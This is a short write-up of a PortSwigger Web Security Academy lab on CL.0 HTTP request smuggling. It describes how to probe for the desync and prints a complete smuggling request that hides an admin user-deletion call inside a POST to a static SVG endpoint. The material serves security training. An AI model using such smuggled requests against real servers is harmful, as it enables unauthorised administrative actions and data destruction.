# Lab 06 — CL.0 request smuggling

> **Expert** · [Official lab](https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling)

**Entry point:** some back-ends **ignore Content-Length** on certain
endpoints (often static resources) — a CL.0 desync.

## Solution

1. Probe with a request group (single connection, keep-alive): POST to a
   candidate endpoint with a correct `Content-Length` containing a smuggled
   `GET /hopefully404 HTTP/1.1` prefix. A 404 response to the second
   request proves the desync.
2. Vulnerable endpoint found: `/resources/images/blog.svg` (static
   resources).
3. Exploit — smuggle the admin deletion through the SVG request:

```http
POST /resources/images/blog.svg HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```

(Send the poison request, then any ordinary request triggers it.) Lab
solved.

## Notes

Test every endpoint for CL.0 — "harmless" static files are the usual
desync vector.
